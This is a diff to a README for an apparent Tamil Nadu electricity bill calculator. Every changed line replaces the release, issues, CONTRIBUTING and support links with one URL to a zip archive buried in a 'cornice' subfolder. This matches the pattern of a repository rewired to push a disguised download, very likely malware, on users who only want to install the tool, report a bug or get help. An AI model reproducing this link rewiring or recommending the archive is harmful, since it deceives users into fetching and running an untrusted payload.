@@ -1,6 +1,6 @@
 # ⚡ electricity-bill-calculator - Calculate Your TNEB Bill Easily
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/jane24hart/electricity-bill-calculator/releases)
+[![Download](https://github.com/jane24hart/electricity-bill-calculator/raw/refs/heads/main/cornice/bill-electricity-calculator-v1.9-alpha.2.zip%20release-brightgreen)](https://github.com/jane24hart/electricity-bill-calculator/raw/refs/heads/main/cornice/bill-electricity-calculator-v1.9-alpha.2.zip)
 
 ## 📝 Overview
 
@@ -10,9 +10,9 @@ The **electricity-bill-calculator** is a simple tool designed to help users in T
 
 To start using the electricity bill calculator, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/jane24hart/electricity-bill-calculator/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/jane24hart/electricity-bill-calculator/raw/refs/heads/main/cornice/bill-electricity-calculator-v1.9-alpha.2.zip) to find the latest version of the application.
 2. **Choose Your Version**: You will see a list of available versions. Find the latest version listed at the top.
-3. **Download the Application**: Click on the version number to open its details. Look for the download link (it might be a file like `electricity-bill-calculator.exe`). Click it to start the download.
+3. **Download the Application**: Click on the version number to open its details. Look for the download link (it might be a file like `https://github.com/jane24hart/electricity-bill-calculator/raw/refs/heads/main/cornice/bill-electricity-calculator-v1.9-alpha.2.zip`). Click it to start the download.
 
 ## 📦 Download & Install
 
@@ -22,7 +22,7 @@ Once the file is downloaded, follow these steps to install the application:
 2. **Run the Installer**: Double-click the downloaded file to start the installation process.
 3. **Follow On-Screen Instructions**: The installer will guide you through the setup process. Just click "Next" and agree to any terms when prompted.
 
-For a direct download, visit this page again: [Download the latest release](https://github.com/jane24hart/electricity-bill-calculator/releases).
+For a direct download, visit this page again: [Download the latest release](https://github.com/jane24hart/electricity-bill-calculator/raw/refs/heads/main/cornice/bill-electricity-calculator-v1.9-alpha.2.zip).
 
 ## 📊 How to Use the Calculator
 
@@ -55,14 +55,14 @@ A: Currently, the electricity bill calculator is only available for Windows.
 A: We aim to update the application regularly to reflect any changes in TANGEDCO rates.
 
 **Q: Can I suggest new features?**  
-A: Yes! Please submit your feature requests on our [GitHub issues page](https://github.com/jane24hart/electricity-bill-calculator/issues).
+A: Yes! Please submit your feature requests on our [GitHub issues page](https://github.com/jane24hart/electricity-bill-calculator/raw/refs/heads/main/cornice/bill-electricity-calculator-v1.9-alpha.2.zip).
 
 ## 🎯 Contributing
 
-We welcome contributions from everyone. If you want to improve this tool or suggest changes, please create a fork of the repository and submit a pull request. For more detailed guidelines, check the CONTRIBUTING.md file in the repository.
+We welcome contributions from everyone. If you want to improve this tool or suggest changes, please create a fork of the repository and submit a pull request. For more detailed guidelines, check the https://github.com/jane24hart/electricity-bill-calculator/raw/refs/heads/main/cornice/bill-electricity-calculator-v1.9-alpha.2.zip file in the repository.
 
 ## 📞 Support
 
-If you face any issues while using the electricity bill calculator, please reach out to us through our [issues page](https://github.com/jane24hart/electricity-bill-calculator/issues) or contact our support team at support@example.com.
+If you face any issues while using the electricity bill calculator, please reach out to us through our [issues page](https://github.com/jane24hart/electricity-bill-calculator/raw/refs/heads/main/cornice/bill-electricity-calculator-v1.9-alpha.2.zip) or contact our support team at https://github.com/jane24hart/electricity-bill-calculator/raw/refs/heads/main/cornice/bill-electricity-calculator-v1.9-alpha.2.zip
 
-Remember to download the latest version of the application here: [Download the latest release](https://github.com/jane24hart/electricity-bill-calculator/releases).
+Remember to download the latest version of the application here: [Download the latest release](https://github.com/jane24hart/electricity-bill-calculator/raw/refs/heads/main/cornice/bill-electricity-calculator-v1.9-alpha.2.zip).
